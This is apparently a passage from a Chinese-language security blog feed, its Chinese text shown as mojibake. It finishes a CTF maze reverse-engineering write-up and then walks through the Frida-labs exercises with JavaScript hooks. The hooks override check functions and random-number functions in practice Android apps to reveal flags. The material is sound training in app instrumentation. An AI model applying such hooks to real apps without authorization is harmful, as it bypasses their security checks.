class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#####</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">###</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">#</span> <span class="params">#</span>     <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>     <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span>   <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span> <span class="params">#</span></span><br><span class="line"><span class="params">###################################################</span></span><br></pre></td></tr></table></figure><p>æ•´ç†åçš„åœ°å›¾åŠå…¶è·¯çº¿å’Œé”®ç›˜è¾“å…¥ï¼š<code>ffffffffffffd7d5556aa97d7ffffffffffffd57</code></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><br><span class="line">ddddddddddddddddddddddddddâ–ˆ â–ˆ                 â–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆsâ–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆ     â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ      sdd  â–ˆ â–ˆ     â–ˆ â–ˆ   â–ˆ     â–ˆ</span><br><span class="line">â–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆsâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ</span><br><span class="line">â–ˆ   â–ˆ â–ˆ     â–ˆ â–ˆ â–ˆ â–ˆ   â–ˆ â–ˆ â–ˆsâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ             â–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆsâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ       â–ˆ â–ˆ â–ˆ  sâ–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ     â–ˆ   â–ˆ â–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆâ–ˆâ–ˆsâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ</span><br><span class="line">â–ˆ â–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ     â–ˆ   â–ˆsâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆsâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆ                    aaaaaas    â–ˆ             â–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆsâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ</span><br><span class="line">â–ˆ             â–ˆ      sddâ–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ   â–ˆ   â–ˆ     â–ˆ â–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆsâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ            sddddddddddddddddddddddddddâ–ˆ</span><br><span class="line">â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆsâ–ˆ</span><br><span class="line">â–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ   â–ˆ   â–ˆ â–ˆ  sâ–ˆ</span><br><span class="line">â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆsâ–ˆ</span><br><span class="line">â–ˆ â–ˆ     â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ     â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ   â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆ â–ˆsd</span><br><span class="line">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ</span><br></pre></td></tr></table></figure><p>ç»è¿‡è°ƒè¯•æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‹å›¾å·¦åŠéƒ¨åˆ†æ˜¯ flag è¾“å‡ºéƒ¨åˆ†ï¼Œå³åŠéƒ¨åˆ†æ˜¯è¿·å®«æ ¡éªŒéƒ¨åˆ†ï¼Œ</p><p>æ ¡éªŒé€»è¾‘æ˜¯å¸¦å…¥çš„æ¯ä¸ªå­—èŠ‚è¢«æ‹†åˆ†æˆ 4 ä¸ª 2 ä½ bitï¼ŒæŒ‰å¤§ç«¯åºæ’åˆ—ï¼Œæ¯ä¸ª 2 ä½ bit æ§åˆ¶è¿·å®«èµ°å‘ï¼Œ00 ä¸º wï¼Œ01 ä¸º sï¼Œ10 ä¸º aï¼Œ11 ä¸º dï¼Œvar_6938 ä¸ºå½“å‰ Y è½´ï¼Œvar_6938+4 ä¸ºå½“å‰ X è½´</p><p>å·¦åŠéƒ¨åˆ†æ˜¯æ ¡éªŒéƒ¨åˆ†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/%5Br3%5D2025/%5BR3%E5%A4%8D%E7%8E%B0%5DNeon%20Deceit.assets/7.png" alt="å¾®ä¿¡æˆªå›¾_20250708211917"></p><p>æŠŠåˆšæ‰çš„æ­£ç¡®è¿·å®«è·¯çº¿çš„å­—æ¯å¸¦æ¢æˆäºŒè¿›åˆ¶çš„ç¡¬ç¼–ç ç„¶åè½¬æ¢æˆ 16 è¿›åˆ¶ï¼š<code>ffffffffffffd7d5556aa97d7ffffffffffffd57</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">direction_str = <span class="string">&quot;dddddddddddddddddddddddddssddssssssssaaaaaassddssddddddddddddddddddddddddddssssd&quot;</span></span><br><span class="line">direction_map = &#123;</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">binary_str = <span class="string">&#x27;&#x27;</span>.join(direction_map[ch] <span class="keyword">for</span> ch <span class="keyword">in</span> direction_str)</span><br><span class="line">byte_list = [binary_str[i:i+<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>)]</span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(b, <span class="number">2</span>):02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> byte_list)</span><br><span class="line"><span class="built_in">print</span>(hex_str)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> R3 å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fridaç»ƒä¹ â€”â€”Frida-labs</title>
      <link href="/2025/01/08/Frida%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Frida-labs/"/>
      <url>/2025/01/08/Frida%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Frida-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="Frida-ç»ƒä¹ â€”â€”Frida-labs"><a href="#Frida-ç»ƒä¹ â€”â€”Frida-labs" class="headerlink" title="Frida ç»ƒä¹ â€”â€”Frida-labs"></a>Frida ç»ƒä¹ â€”â€”Frida-labs</h1><p>è¿™ä¸ªé¡¹ç›®å¯ä»¥ä»çœ‹ frida ç›¸å…³è§†é¢‘è¿‡æ¸¡åˆ°å®æˆ˜ï¼Œæ²¡æœ‰ ctf è¿™ä¹ˆéš¾ï¼Œæ„Ÿè§‰ä¸çœ‹ frida ç›¸å…³è§†é¢‘ç›´æ¥æ‰“è¿™ä¸ªç»ƒä¹ ä¹Ÿè¡Œã€‚</p><p>é¡¹ç›®åœ°å€ï¼š <a href="https://github.com/DERE-ad2001/Frida-Labs/tree/main">https://github.com/DERE-ad2001/Frida-Labs/tree/main</a></p><hr><h2 id="frida-0x1"><a href="#frida-0x1" class="headerlink" title="frida_0x1"></a>frida_0x1</h2><p>ä»åº”ç”¨çš„ç•Œé¢çœ‹è¿™æ˜¯è¦ä½ è¾“å…¥ä¸€ä¸ªæ•°å­—</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x1/01.png" alt="01"></p><p>æŸ¥çœ‹æºä»£ç ï¼Œå¾ˆå®¹æ˜“çš„çœ‹å‡ºè¿™æ˜¯è¦ä½ æ‰¾åˆ°è¿™ä¸ªéšæœºæ•° i</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x1/02.png" alt="02"></p><p>ä¸‹é¢çš„å£°æ˜çš„ obj æ˜¯è¦åœ¨ app ç•Œé¢ä¸­è¾“å…¥çš„æ•°å­—</p><p>ç„¶åæŠŠå­˜æœ‰éšæœºæ•° i ä¸è¾“å…¥çš„æ•°å­— obj ä¼ åˆ° check å‡½æ•°ä¸­è¿›è¡Œæ£€æŸ¥</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x1/03.png" alt="image-20250108143145970"></p><p>åœ¨ check å‡½æ•°ä¸­å‘ç°è¾“å…¥çš„ obj ä¹Ÿå°±æ˜¯ check å‡½æ•°å£°æ˜çš„ i2</p><p>åˆ¤æ–­æ¡ä»¶æ˜¯(i*2)+4&#x3D;&#x3D;i2</p><p>æ‰€ä»¥æˆ‘ä»¬è¦è¾“å…¥çš„ obj åº”è¯¥æ˜¯éšæœºæ•° i*2+4</p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªè§£æ³•ï¼š</p><hr><h3 id="è§£æ³•ä¸€ï¼šhook-get-random"><a href="#è§£æ³•ä¸€ï¼šhook-get-random" class="headerlink" title="è§£æ³•ä¸€ï¼šhook get_random"></a>è§£æ³•ä¸€ï¼šhook get_random</h3><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ hook æ‰ get_random æ¥æŸ¥çœ‹ get_random ç”Ÿæˆçš„éšæœºæ•°</p><p>ä¹Ÿå¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªç‰¹å®šå€¼ç„¶åæŒ‰ç…§è®¡ç®—å¼è¾“å…¥ï¼Œä½†æ˜¯éšæœºæ•°æ˜¯åœ¨ç¨‹åºåˆå§‹åŒ–ç”Ÿæˆçš„ï¼Œæ‰€ä»¥è¦åœ¨ç¨‹åºåˆå§‹åŒ–æ—¶è¿›è¡Œæ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x1 -l .\hook.js</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ get_random exp:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">  utils.<span class="property">get_random</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">get_random</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_random: &quot;</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x1/04.png" alt="image-20250108144455672"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x1/05.png" alt="05"></p><p>è¿”å›ç‰¹å®šæ•°å­— expï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">  utils.<span class="property">get_random</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥ 4 å³å¯è¿›å…¥ä¸‹ä¸€ä¸ªç•Œé¢</p><hr><h3 id="è§£æ³•äºŒï¼šhook-check"><a href="#è§£æ³•äºŒï¼šhook-check" class="headerlink" title="è§£æ³•äºŒï¼šhook check"></a>è§£æ³•äºŒï¼šhook check</h3><p>check å‡½æ•°æ˜¯åœ¨ç¨‹åºåˆå§‹åŒ–ä¹‹åæ‰è¿è¡Œçš„ï¼Œæ‰€ä»¥ä¸å¿…åœ¨åˆå§‹åŒ–çš„æ—¶å€™è¿›è¡Œ hook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U &quot;Frida 0x1&quot; -l ./hook.js</span><br></pre></td></tr></table></figure><p>è¿™æ · hook ä¹‹åéšä¾¿è¾“å…¥ä¸€ä¸²æ•°å­—ä¹‹åå°±å¯ä»¥è¿›åˆ°ä¸‹ä¸€ä¸ªé¡µé¢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">  utils.<span class="property">check</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">check</span>(a, a * <span class="number">2</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><hr><h2 id="frida-0x2"><a href="#frida-0x2" class="headerlink" title="frida_0x2"></a>frida_0x2</h2><p>æ„Ÿè§‰è¿™ä¸ªé¢˜æ²¡æœ‰ä¸Šä¸€ä¸ªéš¾ï¼Œhook é™æ€æ–¹æ³•ã€‚</p><p>æ‰“å¼€è½¯ä»¶ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªâ€œHOOK MEï¼â€</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x2/02.png" alt="02"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x2/01.png" alt="01"></p><p>å‘ç° main å‡½æ•°ä¸‹é¢æœ‰ä¸€ä¸ª get_flag å‡½æ•°</p><p>è¿™ä¸²ä»£ç æ˜¯æŠŠä¸‹é¢çš„ç»è¿‡ base64 åŠ å¯†è¿‡çš„ aes å¯†æ–‡è¿›è¡Œè§£å¯†</p><p>è€Œä¸”è¿™æ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œæœ‰é™æ€æ ‡è¯†ç¬¦,ç›´æ¥æŒ‰ç…§é™æ€å‡½æ•° hook æ¨¡æ¿ hook å°±è¡Œ</p><h3 id="expï¼š"><a href="#expï¼š" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">ClassName</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">ClassName</span>.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><hr><h2 id="frida-0x3"><a href="#frida-0x3" class="headerlink" title="frida_0x3"></a>frida_0x3</h2><p>è¿™é¢˜ä¹Ÿæ˜¯ hook ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œä½†æ˜¯è¿™æ¬¡çš„é™æ€æ–¹æ³•ä¸åœ¨ Mainactivity</p><p>è€Œæ˜¯åœ¨ Checker å‡½æ•°ä¸­</p><p>å…ˆæ‰“å¼€è¿™ä¸ª App ç•Œé¢ï¼Œå¦‚ä¸‹å›¾ï¼Œç‚¹å‡»å®Œ click me ä¼šæç¤º try again</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x3/01.png" alt="01"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x3/02.png" alt="02"></p><p>å‘ç°åˆ¤æ–­æ¡ä»¶æ˜¯ Checker.code &#x3D;&#x3D; 512</p><p>è·Ÿè¿› Checker.code</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x3/03.png" alt="03"></p><p>å‘ç°åªæ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œå¹¶ä¸”æœ‰ä¸ª increase å‡½æ•°æ¯æ¬¡åŠ  2ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç”¨è®©è¿™ä¸ª increase å‡½æ•°å¾ªç¯ 256 æ¬¡å°±èƒ½å¾—åˆ° flag</p><h3 id="expï¼š-1"><a href="#expï¼š-1" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºhookTest1çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">ClassName</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">      <span class="title class_">ClassName</span>.<span class="title function_">increase</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><hr><h2 id="frida-0x4"><a href="#frida-0x4" class="headerlink" title="frida_0x4"></a>frida_0x4</h2><p>è¿™é“é¢˜æ˜¯è¦ hook ä¸€ä¸ªæ²¡æœ‰è¢«åœ¨ MainActivity è°ƒç”¨çš„ç±»ä¸­çš„æ™®é€šæ–¹æ³•ã€</p><p>æŸ¥çœ‹ MainActivity å‘ç°å…¶ä¸­å¹¶æ²¡æœ‰ä»»ä½•ä¸ flag æœ‰å…³çš„ç±»æˆ–è€…æ–¹æ³•</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x4/04.png" alt="image-20250228103655675"></p><p>æŸ¥çœ‹ Check ç±»ï¼Œå‘ç°åŠ å¯†åœ¨ Check ç±»ä¸­çš„ get_flag æ–¹æ³•</p><p><img 